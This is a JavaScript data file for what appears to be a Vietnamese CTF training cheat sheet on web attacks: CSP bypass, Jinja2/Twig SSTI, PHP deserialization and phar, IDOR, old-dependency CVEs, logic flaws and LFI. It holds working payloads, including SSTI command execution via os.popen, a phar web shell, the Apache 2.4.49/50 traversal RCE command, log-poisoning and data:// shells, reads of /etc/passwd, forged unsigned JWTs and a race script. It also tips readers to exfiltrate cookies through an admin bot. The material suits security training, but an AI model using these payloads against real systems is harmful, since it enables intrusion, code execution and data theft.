DATA.find(s => s.id === "web").items.push(
  {
    id: "web-csp",
    title: "CSP bypass",
    summary: "CSP không chỉ là header để đọc. Tìm host được phép, JSONP/AngularJS, hoặc tag/event chưa bị WAF chặn.",
    tags: ["csp", "xss", "waf", "angularjs"],
    priority: "high",
    signals: [
      "Response có CSP header",
      "CSP allow CDN: cdnjs, jsdelivr, googleapis",
      "WAF xóa chữ script hoặc chặn tag/event",
      "Có stored XSS + admin bot",
      "Có JSONP endpoint trên host được phép"
    ],
    checklist: [
      "Đọc CSP: default-src, script-src, script-src-elem, nonce/hash, report-uri.",
      "Liệt kê host được phép; tìm JSONP/AngularJS/UMD trên CDN đó.",
      "Thử inline/nonce/hash; thử override script-src-elem bằng header injection.",
      "Thử AngularJS: ng-app, ng-csp, expression trong {{ }}.",
      "Test tag/event: details/ontoggle, svg/onload, marquee/onstart, video/source onerror.",
      "Nếu WAF xóa 'script', dùng tag/event hoặc JSONP thay vì thẻ script.",
      "Nếu có bot: exfil cookie hoặc CSRF token."
    ],
    payloads: [
      {
        title: "AngularJS từ CDN được phép",
        code: C(
          "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js'></scr" + "ipt>",
          "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"
        )
      },
      {
        title: "Tag/event khi thẻ script bị chặn",
        code: C(
          "<details open ontoggle=alert(1)>",
          "<svg onload=alert(1)>",
          "<marquee onstart=alert(1)>",
          "<video><source onerror=alert(1)>"
        )
      },
      {
        title: "CSP header injection (nếu param nối vào header)",
        code: "x;script-src-elem 'unsafe-inline';"
      },
      {
        title: "JSONP trên host allowlist (ví dụ)",
        code: "<script src='https://allowed-host/jsonp?callback=alert(1)//'></scr" + "ipt>"
      }
    ],
    commands: [
      {
        title: "Đọc CSP",
        code: "curl -sI http://TARGET/ | grep -i content-security-policy"
      }
    ],
    gotchas: [
      "CSP report-only không chặn; kiểm tra header enforce.",
      "script-src-elem có thể override script-src cho thẻ script.",
      "AngularJS chỉ chạy nếu app đã load Angular hoặc bạn load được từ CDN allowlist.",
      "WAF có thể chặn theo tag, event, keyword; brute danh sách từ PortSwigger cheat sheet.",
      "Bot có thể không ra Internet; ưu tiên same-origin fetch/redirect."
    ],
    links: [
      { title: "AngularJS CSP bypass (Huli)", url: "https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/" },
      { title: "PortSwigger CSP", url: "https://portswigger.net/web-security/cross-site-scripting/content-security-policy" },
      { title: "BKSEC Training — Easy/Medium CSP", url: "https://training.bksec.vn" }
    ]
  },
  {
    id: "web-ssti",
    title: "SSTI (Jinja2/Twig)",
    summary: "Template injection: thử polyglot, nhận diện engine, rồi đi từ object đến os/exec. Gặp WAF thì bypass bằng attr/getitem/hex.",
    tags: ["ssti", "jinja2", "twig", "python"],
    priority: "high",
    signals: [
      "Input vào template: name, email, todo, report",
      "Response chứa {{ }}, ${ }, <%= %>, #{ }",
      "{{7*7}} trả về 49",
      "WAF chặn 'config' hoặc dấu _"
    ],
    checklist: [
      "Polyglot: ${{<%[%'\"}}%\\.",
      "Nhận diện engine: Jinja2, Twig, Freemarker, Smarty, Handlebars.",
      "Test {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>.",
      "Thử {{config}}, {{self}}, {{request}}; nếu bị chặn, dùng attr/getitem.",
      "Đi từ object đến __globals__/os/exec trên Jinja2.",
      "Twig: _self.env.registerUndefinedFilterCallback + getFilter.",
      "Kiểm tra sandbox và encoding; thử hex escape cho dấu _."
    ],
    payloads: [
      {
        title: "Polyglot detect",
        code: "${{<%[%'\"}}%\\."
      },
      {
        title: "Jinja2 cơ bản",
        code: C(
          "{{7*7}}",
          "{{ config }}",
          "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}"
        )
      },
      {
        title: "Jinja2 qua attr/getitem (WAF chặn dấu _)",
        code: "{{ cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}"
      },
      {
        title: "Twig",
        code: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
      }
    ],
    gotchas: [
      "WAF có thể chặn _, config, class; dùng attr/getitem hoặc hex escape.",
      "Jinja2 sandbox có thể chặn __globals__; tìm gadget khác.",
      "Twig payload phụ thuộc version.",
      "Blind SSTI: dùng lỗi/time/outbound request để xác nhận."
    ],
    links: [
      { title: "Todo-app writeup (BKSEC Training)", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "HackTricks SSTI", url: "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html" },
      { title: "The Hacker Recipes SSTI", url: "https://www.thehacker.recipes/web/inputs/ssti" }
    ]
  },
  {
    id: "web-deser",
    title: "Deserialization (PHP/phar)",
    summary: "Cookie serialize, object injection, signed cookie loose compare, phar://. Đây là chuỗi hay gặp ở Happy Soldier và Three Steps.",
    tags: ["deserialization", "php", "phar", "cookie"],
    priority: "high",
    signals: [
      "Cookie base64 decode ra O:... hoặc a:...",
      "Có unserialize()/phar:// trong source",
      "Cookie có chữ ký sig/hash",
      "Có upload file + include",
      "Magic method __wakeup/__destruct"
    ],
    checklist: [
      "Decode cookie/base64; nhận diện PHP serialize.",
      "Sửa thuộc tính object (coins/health/role); encode lại; gửi thử.",
      "Kiểm tra chữ ký: nếu là loose compare (==), thử type juggling.",
      "Tìm magic method và gadget trong source.",
      "Nếu có phar: tạo .phar, upload, include qua phar://.",
      "Đọc /secret.txt hoặc flag; nếu cần thì RCE."
    ],
    payloads: [
      {
        title: "PHP serialized object (Happy Soldier)",
        code: 'O:6:"Player":4:{s:6:"health";i:9999;s:6:"attack";i:9999;s:5:"coins";i:999;s:6:"weapon";s:12:"Wooden Sword";}'
      },
      {
        title: "Base64 cookie",
        code: C(
          "python3 - <<'PY'",
          "import base64",
          "s = 'O:6:\"Player\":4:{s:6:\"health\";i:9999;s:6:\"attack\";i:9999;s:5:\"coins\";i:999;s:6:\"weapon\";s:12:\"Wooden Sword\";}'",
          "print(base64.b64encode(s.encode()).decode())",
          "PY"
        )
      },
      {
        title: "Phar generator",
        code: C(
          "<?php",
          "$p = new Phar('shell.phar');",
          "$p->startBuffering();",
          "$p->addFromString('test.php', '<?php system($_GET[\"c\"]); ?>');",
          "$p->setStub('<?php __HALT_COMPILER(); ?>');",
          "$p->stopBuffering();",
          "?>"
        )
      }
    ],
    gotchas: [
      "phar.readonly=1 mặc định; chạy php -d phar.readonly=0 khi tạo.",
      "Chữ ký có thể là HMAC/serialize; loose compare chỉ ăn với ==.",
      "PHP 8 thay đổi một số so sánh lỏng; đừng copy máy móc.",
      "__wakeup có thể bị bypass bằng serialization references.",
      "Phar cần include bằng phar:// mới trigger."
    ],
    links: [
      { title: "Happy Soldier writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "Three Steps to Heaven writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "PortSwigger deserialization", url: "https://portswigger.net/web-security/deserialization" }
    ]
  },
  {
    id: "web-idor",
    title: "IDOR / API leak",
    summary: "Đổi id/user/role để đọc dữ liệu người khác. Training có low effort sns 2 (Go API) và OpenSource 2 (Next.js profile).",
    tags: ["idor", "api", "graphql", "go", "nextjs"],
    priority: "high",
    signals: [
      "API /api/user/:id, /api/profile?id=1",
      "Trang profile/secret/admin",
      "GraphQL endpoint /graphql",
      "Response chứa object có id/role",
      "Có source code hoặc route list"
    ],
    checklist: [
      "Liệt kê endpoint từ JS/source map/routes.",
      "Đổi id/user/role sang admin hoặc id khác.",
      "Thử bỏ auth header; thử method khác (GET/POST/PUT).",
      "GraphQL: introspection, query users/secrets.",
      "So sánh response length/status giữa các id.",
      "Kiểm tra UUID/encode; thử id âm/0/lớn."
    ],
    payloads: [
      {
        title: "REST IDOR",
        code: C(
          "GET /api/profile?id=1",
          "GET /api/user/1/secret",
          "GET /api/users/1"
        )
      },
      {
        title: "GraphQL",
        code: C(
          "POST /graphql {\"query\":\"{ users { id name secret } }\"}",
          "POST /graphql {\"query\":\"{ __schema { types { name fields { name } } } }\"}"
        )
      }
    ],
    gotchas: [
      "401/403 vẫn có thể leak nếu đổi method/header.",
      "UUID không đoán được; tìm trong JS/source map.",
      "Một số API yêu cầu auth; thử token của user thường.",
      "GraphQL introspection có thể bị tắt; thử field guessing."
    ],
    links: [
      { title: "low effort sns 2 writeup", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
      { title: "OpenSource is the best 2 writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "PortSwigger IDOR", url: "https://portswigger.net/web-security/access-control/idor" }
    ]
  },
  {
    id: "web-source",
    title: "Source review & old deps",
    summary: "View-source, source map, comment base64, version banner, dependency CVE. Training có OpenSource 0.5/1/2 và cutie web framework.",
    tags: ["source", "cve", "nextjs", "vite", "apache"],
    priority: "high",
    signals: [
      "Có source code / source map / Vite / Next.js",
      "Comment base64 trong HTML/JS",
      "Server version cũ (Apache, framework)",
      "Có GraphQL playground hoặc API docs",
      "Dependency lỗi thời"
    ],
    checklist: [
      "View-source toàn bộ HTML; đọc comment và script src.",
      "Tìm source map, JS bundle, chunk, route manifest.",
      "Decode base64/comment; tìm endpoint/secret.",
      "Đọc response headers: Server, X-Powered-By, Last-Modified.",
      "Tra CVE theo version (Apache 2.4.49/50, Next.js, framework).",
      "GraphQL: mở /graphql, introspection, query.",
      "Đọc source backend nếu được cung cấp; grep sink."
    ],
    payloads: [
      {
        title: "Apache 2.4.49/2.4.50 path traversal RCE",
        code: "curl --path-as-is 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"
      },
      {
        title: "GraphQL introspection",
        code: "POST /graphql {\"query\":\"{ __schema { queryType { fields { name } } } }\"}"
      }
    ],
    commands: [
      {
        title: "Headers + source",
        code: C(
          "curl -i -s http://TARGET/ | head -50",
          "curl -s http://TARGET/ | grep -iE 'sourceMappingURL|comment|base64|/api/'",
          "curl -s http://TARGET/static/js/main.js | tail -5"
        )
      }
    ],
    gotchas: [
      "Source map có thể bị xóa ở production; thử chunk khác.",
      "Version trong header có thể bị fake; xác nhận bằng behavior.",
      "Apache 2.4.49/50 PoC cần đúng path và CGI enabled.",
      "Next.js/Vite có nhiều endpoint ẩn trong build manifest."
    ],
    links: [
      { title: "open source is the best 0.5 writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "OpenSource is the best 2 writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "cutie web framework writeup", url: "https://github.com/kyrux29/CTF_WRITEUPS" }
    ]
  },
  {
    id: "web-logic",
    title: "Logic, race & type juggling",
    summary: "Gambling/coin/coupon: đọc điều kiện thắng, thử JWT không ký, PHP type juggling, race, brute session, prototype pollution.",
    tags: ["logic", "race", "php", "jwt", "gambling"],
    priority: "high",
    signals: [
      "Game coin/gambling/coupon, mục tiêu đạt N điểm",
      "JWT không có chữ ký hoặc alg none",
      "Balance lưu trong session/cookie",
      "Server so sánh string với number",
      "Có redeem/withdraw/bet"
    ],
    checklist: [
      "Đọc điều kiện thắng và nơi lưu balance.",
      "Decode JWT; thử alg none/đổi user.",
      "Thử type juggling: 1000a, 1e10, 0e..., số âm, float.",
      "Thử race: gửi nhiều request song song.",
      "Thử brute-force session/request nếu server random.",
      "Thử prototype pollution (`__proto__`, constructor.prototype).",
      "Kiểm tra integer overflow/round-down."
    ],
    payloads: [
      {
        title: "PHP type juggling",
        code: C(
          "amount=1000a",
          "amount=1e10",
          "amount=0e123456",
          "coins=9e0"
        )
      },
      {
        title: "JWT không chữ ký",
        code: C(
          "import base64, json",
          "b64 = lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()",
          "print(b64({'alg':'none','typ':'JWT'}) + '.' + b64({'user':'admin'}) + '.')"
        )
      },
      {
        title: "Race bằng Python threads",
        code: C(
          "import requests, concurrent.futures",
          "url = 'http://TARGET/api/bet'",
          "def go(i): return requests.post(url, json={'bet':'even','amount':1}, timeout=5).status_code",
          "with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:",
          "    print(list(ex.map(go, range(30))))"
        )
      }
    ],
    gotchas: [
      "PHP 7 vs 8 khác nhau ở so sánh lỏng; kiểm tra version.",
      "Server có thể validate balance phía server; đừng chỉ sửa client.",
      "Race cần đúng timing; dùng gate/pipeline (Turbo Intruder) nếu cần.",
      "Prototype pollution chỉ ăn nếu có merge/assign không an toàn."
    ],
    links: [
      { title: "Gambling Coin 1/2 writeups", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
      { title: "Real Gambling Experience writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "Double or Nothing writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" }
    ]
  },
  {
    id: "web-lfi",
    title: "LFI & PHP wrappers",
    summary: "?page=, ?pill=, include/download: đọc source, wrapper, log/session, phar, filter chain. Gặp ở Red Pill và Three Steps.",
    tags: ["lfi", "php", "phar", "wrapper"],
    priority: "high",
    signals: [
      "Tham số page/file/include/template/pill",
      "Lỗi PHP lộ path hoặc include",
      "Có chức năng download/read file",
      "Có upload + include",
      "Source PHP được cung cấp"
    ],
    checklist: [
      "Thử ../../etc/passwd và các biến thể encode.",
      "Đọc source: php://filter/convert.base64-encode/resource=index.php.",
      "Thử data://, zip://, phar://, php://input.",
      "Log poisoning: User-Agent vào access.log.",
      "Session file: /tmp/sess_<id> nếu biết session id.",
      "pearcmd / filter chain nếu bị chặn.",
      "Kiểm tra open_basedir/disable_functions."
    ],
    payloads: [
      {
        title: "Traversal + wrapper",
        code: C(
          "../../../../etc/passwd",
          "php://filter/convert.base64-encode/resource=index.php",
          "data://text/plain,<?php system($_GET['c']); ?>",
          "phar://uploads/shell.phar"
        )
      },
      {
        title: "Log poisoning",
        code: C(
          "User-Agent: <?php system($_GET['c']); ?>",
          "?page=/var/log/apache2/access.log"
        )
      }
    ],
    commands: [
      {
        title: "Filter chain generator",
        code: "python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'"
      }
    ],
    gotchas: [
      "Null byte chỉ ăn với PHP rất cũ.",
      "allow_url_include=Off thì data:///http:// không chạy.",
      "open_basedir chặn đọc file ngoài; thử filter chain.",
      "phar cần include bằng phar://; upload .phar có thể bị chặn."
    ],
    links: [
      { title: "Red Pill or Blue Pill? writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "Three Steps to Heaven writeup", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "PayloadsAllTheThings LFI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" }
    ]
  }
);
